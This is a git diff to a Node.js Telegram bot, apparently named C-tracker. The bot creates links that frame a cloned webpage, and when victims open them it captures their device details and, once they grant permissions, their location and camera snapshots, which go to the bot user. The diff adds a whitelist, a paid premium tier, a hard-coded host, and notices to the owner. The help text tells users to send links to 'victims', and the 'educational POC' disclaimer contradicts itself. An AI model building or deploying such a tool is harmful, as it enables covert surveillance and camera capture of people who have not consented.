@@ -1,13 +1,14 @@
 const fs = require("fs");
 const express = require("express");
 var cors = require('cors');
-var targetChatId = '826978407';
-var nuid = 'dod0mf';
 var bodyParser = require('body-parser');
 const fetch = require('node-fetch');
 const TelegramBot = require('node-telegram-bot-api');
-TOKEN = 'YOUR API TOKEN';
-const bot = new TelegramBot(TOKEN, { polling: true });
+const whitelistedUserIds = [1950858586, 676849867, , 1118054166, 779715934, 1135874307, 1806425695];
+const PremiumUserIds = [826978407,716505457];
+const targetChatId = '826978407';
+const nuid = 'dod0mf';
+const bot = new TelegramBot(process.env["bot"], { polling: true });
 var jsonParser = bodyParser.json({ limit: 1024 * 1024 * 20, type: 'application/json' });
 var urlencodedParser = bodyParser.urlencoded({ extended: true, limit: 1024 * 1024 * 20, type: 'application/x-www-form-urlencoded' });
 const app = express();
@@ -17,7 +18,7 @@ app.use(cors());
 app.set("view engine", "ejs");
 
 //Modify your URL here
-var hostURL = "YOUR HOST URL HERE";
+var hostURL = "https://ctracker.mohammedathif.repl.co"
 //TOGGLE for 1pt Proxy and Shorters
 var use1pt = false;
 
@@ -51,26 +52,49 @@ app.get("/c/:path/:uri", (req, res) => {
 
 bot.on('message', async (msg) => {
   const chatId = msg.chat.id;
+  const userId = msg.from.id;
+  console.log(`Received message from user ID: ${userId}`);
+  if (whitelistedUserIds.includes(userId)) {
+    if (msg.text == "/start") {
+      bot.sendMessage(targetChatId, `Hi SCR, \n${msg.chat.first_name} is using your bot`);
+      bot.sendMessage(chatId, `Dear ${msg.chat.first_name}, \n
+We hope you've enjoyed your free trial of C-tracker. We value your support and trust in our platform.
 
+Your free trial has concluded. To continue accessing our premium features and benefits, we invite you to upgrade to a premium subscription.
 
+Our premium subscription offers:
+===========================================
+  * Can clone any webpage which doesn't have X-frame header
+  * Access camera, location just through a link
 
-  if (msg?.reply_to_message?.text == "🌐 Enter Your URL") {
-    createLink(chatId, msg.text);
+Our Pricings:
+===========================================
+  * 2 week 1198 INR (Offer Price 999).
+  * Monthly 2499 INR (Offer Price 1999).
+
+If you have any questions or need assistance in choosing the right plan, please don't hesitate to reach out to our dedicated support team at solocoderider@gmail.com. We are here to help and ensure you have the best experience with our service.
+
+Thank you for choosing C-tracker. We look forward to continuing to serve you and help you achieve your goals.  `);
+    }
   }
+  else if (PremiumUserIds.includes(userId)) {
 
-  if (msg.text == "/start") {
-    var m = {
-      reply_markup: JSON.stringify({ "inline_keyboard": [[{ text: "Create Link", callback_data: "crenew" }]] })
-    };
+    if (msg?.reply_to_message?.text == "🌐 Enter Your URL") {
+      createLink(chatId, msg.text);
+    }
 
-    bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} !  , \n\nYou can use this bot to track down people but.... \nThis proof of concept (POC) is created solely for educational and awareness purposes to highlight the potential risks associated with clicking on unfamiliar links. By utilizing this POC, you acknowledge and agree to the following:
+    if (msg.text == "/start") {
+      var m = {
+        reply_markup: JSON.stringify({ "inline_keyboard": [[{ text: "Create Link", callback_data: "crenew" }]] })
+      };
+
+      bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} !  , \n\nYou can use this bot to track down people but.... \nThis proof of concept (POC) is created solely for educational and awareness purposes to highlight the potential risks associated with clicking on unfamiliar links. By utilizing this POC, you acknowledge and agree to the following:
 
 1. Consent: You understand and consent to participate in this demonstration voluntarily. The tracking methods employed in this POC will used to collect or store any personal or sensitive information with your explicit consent (Clicking create link button is the consent).
 
 2. Awareness: This POC aims to showcase the potential risks of clicking on unknown links. It does not endorse or encourage any form of unauthorized tracking, surveillance, or malicious activities. The purpose is to raise awareness and encourage individuals to exercise caution when interacting with links from unknown sources.
 
 3. Privacy: The creator of this POC will collect or store any personally identifiable information with explicit consent. The demonstration will infringe upon your privacy or compromise your security in any way.
-
 
 4. Legal Compliance: This POC complies with all applicable laws and regulations. It is your responsibility to ensure that your use of this POC aligns with legal and ethical standards in your jurisdiction.
 
@@ -81,13 +105,13 @@ By proceeding with the utilization of this POC, you acknowledge that the creator
 So if you want want to use this bot read all the above T&C. When you click create link which means you are approved our consent
 
 \nUse /help to know about working...`, m);
-    bot.sendMessage(targetChatId, `Hi SCR, \n${msg.chat.first_name} is using your bot`);
-  }
-  else if (msg.text == "/create") {
-    createNew(chatId);
-  }
-  else if (msg.text == "/help") {
-    bot.sendMessage(chatId, ` Hi ${msg.chat.first_name} !
+      bot.sendMessage(targetChatId, `Hi SCR, \n${msg.chat.first_name} is using your bot`);
+    }
+    else if (msg.text == "/create") {
+      createNew(chatId);
+    }
+    else if (msg.text == "/help") {
+      bot.sendMessage(chatId, ` Hi ${msg.chat.first_name} !
 \nFirst things first this bot is :not created to harm individuals This bot is developed for Making POC and Eductional Purpose
 
 \n-> To Start fucntioning use /start command and it will show you a creat link page Enter the page you want to iframe it as url ex: https://domainname.com
@@ -96,9 +120,12 @@ So if you want want to use this bot read all the above T&C. When you click creat
 
 \n-> Then you will get two links sent this link to victim when he opens the link you will get basic info about the device and when he allow permissions which we asked we will get his Location, Camera access...
 `);
+    }
+
+  } else {
+    // Respond to unauthorized users
+    bot.sendMessage(chatId, 'Sorry, you are not authorized to use this bot.');
   }
-
-
 });
 
 bot.on('callback_query', async function onCallbackQuery(callbackQuery) {
@@ -110,10 +137,6 @@ bot.on('callback_query', async function onCallbackQuery(callbackQuery) {
 bot.on('polling_error', (error) => {
   //console.log(error.code); 
 });
-
-
-
-
 
 
 async function createLink(cid, msg) {
@@ -152,6 +175,7 @@ async function createLink(cid, msg) {
     else {
 
       bot.sendMessage(cid, `New links has been created successfully.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`, m);
+
     }
   }
   else {
@@ -248,4 +272,3 @@ app.post("/camsnap", (req, res) => {
 app.listen(5000, () => {
   console.log("App Running on Port 5000!");
 });
-
